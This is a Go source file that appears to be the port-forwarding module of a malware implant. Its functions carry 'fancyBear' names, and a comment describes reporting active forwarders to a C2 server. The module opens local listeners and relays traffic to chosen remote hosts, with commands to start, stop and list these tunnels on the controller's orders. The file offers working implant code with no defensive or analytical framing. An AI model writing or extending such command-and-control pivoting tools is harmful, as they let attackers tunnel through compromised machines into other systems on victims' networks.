package main

import (
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

type portFwdEntry struct {
	listener net.Listener
	stopCh   chan struct{}
	remote   string
	lport    int
}

var (
	pfwdMap = make(map[int]*portFwdEntry)
	pfwdMu  sync.Mutex
)

// fancyBearPortFwd starts a local TCP listener on 127.0.0.1:lport
// and transparently proxies incoming connections to rhost:rport.
func fancyBearPortFwd(conn net.Conn, lport int, rhost string, rport int) error {
	pfwdMu.Lock()
	if _, exists := pfwdMap[lport]; exists {
		pfwdMu.Unlock()
		return fmt.Errorf("port %d is already being forwarded", lport)
	}

	remoteAddr := net.JoinHostPort(rhost, strconv.Itoa(rport))
	listenAddr := net.JoinHostPort("127.0.0.1", strconv.Itoa(lport))
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		pfwdMu.Unlock()
		return fmt.Errorf("failed to listen on %s: %v", listenAddr, err)
	}

	entry := &portFwdEntry{
		listener: listener,
		stopCh:   make(chan struct{}),
		remote:   remoteAddr,
		lport:    lport,
	}
	pfwdMap[lport] = entry
	pfwdMu.Unlock()

	deoxys("fancyBearPortFwd: Forwarding 127.0.0.1:%d -> %s", lport, remoteAddr)
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("Port forward active: 127.0.0.1:%d -> %s", lport, remoteAddr))))

	guardedGo("portfwd_acceptor", func() {
		for {
			clientConn, err := listener.Accept()
			if err != nil {
				select {
				case <-entry.stopCh:
					return // Stopped intentionally
				default:
					deoxys("fancyBearPortFwd: Accept error: %v", err)
					return
				}
			}

			guardedGo("portfwd_bridge", func() {
				defer clientConn.Close()
				targetConn, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
				if err != nil {
					deoxys("fancyBearPortFwd: Dial target %s failed: %v", remoteAddr, err)
					return
				}
				defer targetConn.Close()

				// Bidirectional proxy
				var wg sync.WaitGroup
				wg.Add(2)
				go func() {
					defer wg.Done()
					io.Copy(targetConn, clientConn)
				}()
				go func() {
					defer wg.Done()
					io.Copy(clientConn, targetConn)
				}()
				wg.Wait()
			})
		}
	})

	return nil
}

// fancyBearPortFwdStop stops a specific port forwarder by local port.
func fancyBearPortFwdStop(conn net.Conn, lport int) error {
	pfwdMu.Lock()
	entry, exists := pfwdMap[lport]
	if !exists {
		pfwdMu.Unlock()
		return fmt.Errorf("no forwarder found on port %d", lport)
	}
	delete(pfwdMap, lport)
	pfwdMu.Unlock()

	close(entry.stopCh)
	entry.listener.Close()
	deoxys("fancyBearPortFwdStop: Stopped forwarder on port %d", lport)
	if conn != nil {
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("Stopped port forwarder on port %d", lport))))
	}
	return nil
}

// fancyBearPortFwdStopAll terminates all active port forwarders.
func fancyBearPortFwdStopAll() {
	pfwdMu.Lock()
	entries := make([]*portFwdEntry, 0, len(pfwdMap))
	for _, entry := range pfwdMap {
		entries = append(entries, entry)
	}
	pfwdMap = make(map[int]*portFwdEntry)
	pfwdMu.Unlock()

	for _, entry := range entries {
		close(entry.stopCh)
		entry.listener.Close()
	}
	deoxys("fancyBearPortFwdStopAll: Stopped %d forwarders", len(entries))
}

// fancyBearPortFwdList sends a list of active port forwarders to C2.
func fancyBearPortFwdList(conn net.Conn) {
	pfwdMu.Lock()
	defer pfwdMu.Unlock()

	if len(pfwdMap) == 0 {
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "No active port forwarders")))
		return
	}

	var sb strings.Builder
	sb.WriteString("Active Port Forwarders:\n")
	for lport, entry := range pfwdMap {
		sb.WriteString(fmt.Sprintf("  127.0.0.1:%d -> %s\n", lport, entry.remote))
	}
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt, sb.String())))
}
